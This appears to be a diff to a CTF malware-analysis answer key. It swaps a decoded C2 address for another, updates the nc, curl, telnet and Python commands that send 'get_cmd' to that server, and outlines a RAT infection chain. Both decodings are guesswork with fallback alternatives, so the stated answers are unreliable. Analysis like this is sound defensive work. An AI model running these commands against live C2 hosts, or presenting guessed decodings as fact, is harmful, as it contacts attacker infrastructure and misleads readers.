@@ -81,24 +81,31 @@ Submit these three file names (one at a time):
 ---
 
 ### 10. 第三阶段载荷获取命令的回连地址为（格式：IP:端口）
-**108.68.49.98:6957**
+**113.11.250.49:3473**
 
-*Decoding method:*
-- IP from `lD1bZ0`: Each ASCII character's decimal value becomes an IP octet
-  - 'l' = ASCII 108
-  - 'D' = ASCII 68  
-  - '1' = ASCII 49
-  - 'b' = ASCII 98
-  - Result: 108.68.49.98
-- Port from `E9dE7d`: Concatenate the ASCII values of first two chars
-  - 'E' = ASCII 69
-  - '9' = ASCII 57
-  - Result: 6957
+*Decoding method (letter-to-number conversion):*
+- Each letter converts to its position in the alphabet (A=0, a=0, etc.)
+- Each digit stays as-is
+
+From `lD1bZ0E9dE7d` (combined 12 characters):
+```
+l=11, D=3, 1=1, b=1, Z=25, 0=0, E=4, 9=9, d=3, E=4, 7=7, d=3
+```
+
+IP (first 8 values as 4 pairs):
+- lD → 11,3 → 113
+- 1b → 1,1 → 11  
+- Z0 → 25,0 → 250
+- E9 → 4,9 → 49
+- **Result: 113.11.250.49**
+
+Port (last 4 values):
+- dE7d → 3,4,7,3 → **3473**
 
 *Alternative interpretations if primary doesn't work:*
-- 108.68.49.98:97 (digits only: 9, 7)
-- 108.68.49.98:14661 (little-endian 16-bit)
-- 108.68.49.98:17721 (big-endian 16-bit)
+- 113.11.250.49:4937
+- 113.11.250.49:7343
+- 108.68.49.98:6957 (ASCII value interpretation)
 
 ---
 
@@ -115,7 +122,7 @@ Submit these three file names (one at a time):
 
 方法1 - 使用 netcat (推荐):
 ```bash
-echo "get_cmd" | nc 108.68.49.98 6957
+echo "get_cmd" | nc 113.11.250.49 3473
 ```
 
 方法2 - 使用 Python:
@@ -124,7 +131,7 @@ import socket
 
 # 创建TCP连接
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("108.68.49.98", 6957))
+s.connect(("113.11.250.49", 3473))
 
 # 发送命令
 s.send(b"get_cmd")
@@ -138,19 +145,19 @@ s.close()
 
 方法3 - 使用 curl (如果是HTTP服务):
 ```bash
-curl http://108.68.49.98:6957/get_cmd
+curl http://113.11.250.49:3473/get_cmd
 ```
 
 方法4 - 使用 telnet:
 ```bash
-telnet 108.68.49.98 6957
+telnet 113.11.250.49 3473
 # 连接后输入: get_cmd
 ```
 
-**备选端口** (如果6957不工作):
-- 108.68.49.98:97
-- 108.68.49.98:14661
-- 108.68.49.98:17721
+**备选地址** (如果主地址不工作):
+- 113.11.250.49:4937
+- 113.11.250.49:7343
+- 108.68.49.98:6957 (ASCII解码方式)
 
 *Note: The actual flag value requires a live network connection to the C2 server, which is only available during the CTF competition time window. The format should be ISCTF{...}*
 
@@ -168,7 +175,7 @@ Stage 3: zTool.dll (DLL sideloading)
     ↓ decrypts payload using XOR (*TV&8utf7)
 Stage 4: UPX-packed backdoor
     ↓ connects to SharePoint then C2 server
-Result: RAT communicates with 108.68.49.98 using "get_cmd"
+Result: RAT communicates with 113.11.250.49:3473 using "get_cmd"
 ```
 
 ### Key Files:
@@ -179,7 +186,7 @@ Result: RAT communicates with 108.68.49.98 using "get_cmd"
 | fR6Wl | Malicious MSI transform |
 | zTool.dll | Malicious DLL (black file) |
 | colonised-my.sharepoint.com | First callback domain |
-| 108.68.49.98 | Command retrieval server |
+| 113.11.250.49:3473 | Command retrieval server |
 
 ### TTPs (MITRE ATT&CK):
 - T1566.001 - Spear Phishing Attachment
